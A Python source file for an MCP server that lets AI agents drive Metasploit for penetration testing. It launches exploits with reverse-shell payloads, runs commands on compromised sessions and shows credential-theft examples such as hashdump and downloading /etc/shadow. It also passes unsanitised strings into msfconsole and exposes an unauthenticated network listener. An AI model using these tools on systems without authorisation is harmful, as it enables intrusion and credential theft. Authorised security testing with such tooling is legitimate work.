"""
Metasploit MCP Server - Exploitation Framework

Exposes Metasploit Framework as MCP tools for agentic penetration testing.
Uses structured tools because Metasploit is stateful (sessions, listeners)
and benefits from explicit parameter handling.

Tools:
    - metasploit_search: Search for modules
    - metasploit_info: Get module details
    - metasploit_module_payloads: List compatible payloads
    - metasploit_payload_info: Get payload details
    - metasploit_exploit: Execute an exploit
    - metasploit_sessions: List active sessions
    - metasploit_session_interact: Run commands on sessions
"""

from fastmcp import FastMCP
import subprocess
import os
from typing import Optional

# Server configuration
SERVER_NAME = "metasploit"
SERVER_HOST = os.getenv("MCP_HOST", "0.0.0.0")
SERVER_PORT = int(os.getenv("METASPLOIT_PORT", "8003"))

mcp = FastMCP(SERVER_NAME)


def _run_msfconsole(commands: str, timeout: int = 120) -> str:
    """Helper to run msfconsole commands."""
    try:
        cmd = ["msfconsole", "-q", "-x", commands]
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        output = result.stdout
        if result.stderr:
            output += f"\n[STDERR]: {result.stderr}"
        return output
    except subprocess.TimeoutExpired:
        return f"[ERROR] Command timed out after {timeout} seconds"
    except FileNotFoundError:
        return "[ERROR] msfconsole not found. Ensure Metasploit is installed."
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def metasploit_search(query: str) -> str:
    """
    Search for Metasploit modules (exploits, payloads, auxiliaries, post).

    Searches the Metasploit module database for matching exploits, auxiliary
    modules, payloads, and post-exploitation modules.

    Args:
        query: Search query. Can include keywords, CVE IDs, or filters.

    Returns:
        List of matching modules with their type, rank, and description

    Examples:
        Search by keyword:
        - "apache struts"
        - "wordpress"
        - "ssh brute"

        Search by CVE:
        - "CVE-2017-5638"
        - "CVE-2021-41773"

        Search with filters:
        - "type:exploit platform:linux apache"
        - "type:exploit platform:windows smb"
        - "type:auxiliary scanner http"
        - "type:post multi gather"

        Search by rank:
        - "rank:excellent type:exploit"
    """
    return _run_msfconsole(f"search {query}; exit", timeout=120)


@mcp.tool()
def metasploit_info(module_name: str) -> str:
    """
    Get detailed information about a Metasploit module.

    Retrieves comprehensive information including description, options,
    targets, references (CVEs, URLs), and author information.

    Args:
        module_name: Full module path (e.g., "exploit/multi/http/struts2_content_type_ognl")

    Returns:
        Module description, required options, targets, and references

    Examples:
        - "exploit/multi/http/struts2_content_type_ognl"
        - "exploit/windows/smb/ms17_010_eternalblue"
        - "auxiliary/scanner/http/dir_scanner"
        - "post/multi/gather/hashdump"
    """
    return _run_msfconsole(f"info {module_name}; exit", timeout=60)


@mcp.tool()
def metasploit_module_payloads(module_name: str) -> str:
    """
    List compatible payloads for an exploit module.

    Shows all payloads that can be used with a specific exploit module,
    filtered by target platform and architecture compatibility.

    Args:
        module_name: Full exploit module path

    Returns:
        List of compatible payloads with their descriptions

    Examples:
        - "exploit/multi/http/struts2_content_type_ognl"
        - "exploit/windows/smb/ms17_010_eternalblue"
        - "exploit/linux/http/apache_normalize_path_rce"
    """
    commands = f"use {module_name}; show payloads; exit"
    return _run_msfconsole(commands, timeout=60)


@mcp.tool()
def metasploit_payload_info(payload_name: str) -> str:
    """
    Get detailed information about a payload.

    Retrieves payload description, required options (LHOST, LPORT, etc.),
    platform compatibility, and architecture requirements.

    Args:
        payload_name: Full payload path (e.g., "linux/x64/meterpreter/reverse_tcp")

    Returns:
        Payload description, options, platform info, and architecture

    Examples:
        - "linux/x64/meterpreter/reverse_tcp"
        - "windows/x64/meterpreter/reverse_tcp"
        - "cmd/unix/reverse_bash"
        - "java/meterpreter/reverse_tcp"
        - "php/meterpreter/reverse_tcp"
    """
    return _run_msfconsole(f"info payload/{payload_name}; exit", timeout=60)


@mcp.tool()
def metasploit_exploit(
    module: str,
    rhosts: str,
    rport: int,
    payload: str,
    lhost: str,
    lport: int,
    extra_options: Optional[str] = None
) -> str:
    """
    Execute a Metasploit exploit with specified payload.

    Configures and launches an exploit module with the specified target
    and payload settings. Runs in job mode (-j) to allow multiple sessions.

    Args:
        module: Exploit module path (e.g., "multi/http/struts2_content_type_ognl")
        rhosts: Target IP address or hostname
        rport: Target port number
        payload: Payload to deliver (e.g., "linux/x64/meterpreter/reverse_tcp")
        lhost: Listener IP address (your attacking machine)
        lport: Listener port number
        extra_options: Additional options as "KEY=VALUE; KEY2=VALUE2" (optional)

    Returns:
        Exploit execution output including session info if successful

    Examples:
        Basic exploit:
        - module="multi/http/struts2_content_type_ognl"
        - rhosts="10.0.0.5"
        - rport=8080
        - payload="linux/x64/meterpreter/reverse_tcp"
        - lhost="10.0.0.10"
        - lport=4444

        With extra options:
        - extra_options="TARGETURI=/struts2-showcase; SSL=false"
    """
    commands = f"""
use {module}
set RHOSTS {rhosts}
set RPORT {rport}
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
"""
    if extra_options:
        for opt in extra_options.split(";"):
            opt = opt.strip()
            if opt and "=" in opt:
                commands += f"set {opt}\n"

    commands += """
exploit -j
sleep 5
sessions -l
exit
"""
    return _run_msfconsole(commands, timeout=180)


@mcp.tool()
def metasploit_sessions() -> str:
    """
    List all active Metasploit sessions.

    Shows all currently active sessions including shell sessions,
    meterpreter sessions, and their connection details.

    Returns:
        Table of active sessions with ID, type, connection info, and target details
    """
    return _run_msfconsole("sessions -l; exit", timeout=30)


@mcp.tool()
def metasploit_session_interact(
    session_id: int,
    command: str,
    timeout: int = 30
) -> str:
    """
    Execute a command on an active Metasploit session.

    Sends a command to an existing session (shell or meterpreter) and
    returns the output. Useful for post-exploitation activities.

    Args:
        session_id: Session ID from metasploit_sessions()
        command: Command to execute on the target
        timeout: Command timeout in seconds (default: 30)

    Returns:
        Command output from the compromised target

    Examples:
        Shell commands:
        - session_id=1, command="whoami"
        - session_id=1, command="id"
        - session_id=1, command="cat /etc/passwd"
        - session_id=1, command="uname -a"
        - session_id=1, command="netstat -tlnp"

        Meterpreter commands:
        - session_id=1, command="sysinfo"
        - session_id=1, command="getuid"
        - session_id=1, command="hashdump"
        - session_id=1, command="ps"
        - session_id=1, command="download /etc/shadow /opt/output/"

        Windows commands:
        - session_id=1, command="whoami /all"
        - session_id=1, command="net user"
        - session_id=1, command="systeminfo"
    """
    # Use -c for running a single command on the session
    commands = f"sessions -i {session_id} -c '{command}'; exit"
    return _run_msfconsole(commands, timeout=timeout + 30)


if __name__ == "__main__":
    import sys

    # Check transport mode from environment
    transport = os.getenv("MCP_TRANSPORT", "stdio")

    if transport == "sse":
        mcp.run(transport="sse", host=SERVER_HOST, port=SERVER_PORT)
    else:
        mcp.run(transport="stdio")
